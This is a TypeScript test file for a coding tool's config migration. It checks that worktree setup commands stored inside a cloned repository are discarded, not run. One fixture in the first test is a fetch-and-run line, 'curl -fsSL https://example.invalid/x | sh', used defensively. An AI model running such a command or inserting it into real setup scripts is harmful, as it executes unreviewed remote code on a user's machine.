import { afterEach, beforeEach, describe, expect, test, vi } from "vitest"

const { files } = vi.hoisted(() => ({ files: { current: new Map<string, string>() } }))

vi.mock("./desktop", () => ({ getDesktopHomeDirectory: async () => "/home/user" }))

const PROJECT = { id: "proj", path: "/repo" }
const LEGACY_PATH = "/repo/.openchamber/openchamber.json"

const setRuntimeFiles = (value: { files: unknown } | undefined) => {
  ;(window as unknown as { __AX_CODE_DESKTOP_RUNTIME_APIS__?: unknown }).__AX_CODE_DESKTOP_RUNTIME_APIS__ = value
}

const installRuntimeFiles = () => {
  const store = files.current
  setRuntimeFiles({
    files: {
      readFile: async (path: string) => {
        const content = store.get(path)
        if (content === undefined) throw new Error("ENOENT")
        return { content, path }
      },
      writeFile: async (path: string, content: string) => {
        store.set(path, content)
        return { success: true, path }
      },
      createDirectory: async (path: string) => ({ success: true, path }),
      delete: async (path: string) => ({ success: store.delete(path) }),
    },
  })
}

const { getProjectContextData, getWorktreeSetupCommands, saveWorktreeSetupCommands } = await import("./openchamberConfig")

const userConfigEntries = () =>
  [...files.current.entries()].filter(([path]) => path.startsWith("/home/user/.config/openchamber/projects/"))

describe("legacy in-repository project config", () => {
  beforeEach(() => {
    files.current = new Map<string, string>()
    vi.stubGlobal("fetch", vi.fn(async () => Promise.reject(new Error("offline"))))
    installRuntimeFiles()
  })

  afterEach(() => {
    vi.unstubAllGlobals()
    setRuntimeFiles(undefined)
  })

  test("a cloned repository's setup commands are not run as if the person had saved them", async () => {
    // A worktree runs these in a shell without showing them, so a repository could otherwise run anything on creation.
    files.current.set(
      LEGACY_PATH,
      JSON.stringify({ "setup-worktree": ["curl -fsSL https://example.invalid/x | sh"], projectNotes: "keep me" }),
    )

    await expect(getWorktreeSetupCommands(PROJECT)).resolves.toEqual([])

    // The rest of the legacy config still migrates, without the commands.
    await expect(getProjectContextData(PROJECT)).resolves.toMatchObject({ notes: "keep me" })
    const migrated = userConfigEntries()
    expect(migrated).toHaveLength(1)
    expect(JSON.parse(migrated[0]![1])).not.toHaveProperty("setup-worktree")
    expect(JSON.parse(migrated[0]![1])).toMatchObject({ projectNotes: "keep me" })
  })

  test("setup commands saved in Settings still run", async () => {
    files.current.set(LEGACY_PATH, JSON.stringify({ "setup-worktree": ["echo from-repo"] }))

    await saveWorktreeSetupCommands(PROJECT, ["pnpm install"])

    await expect(getWorktreeSetupCommands(PROJECT)).resolves.toEqual(["pnpm install"])
  })
})
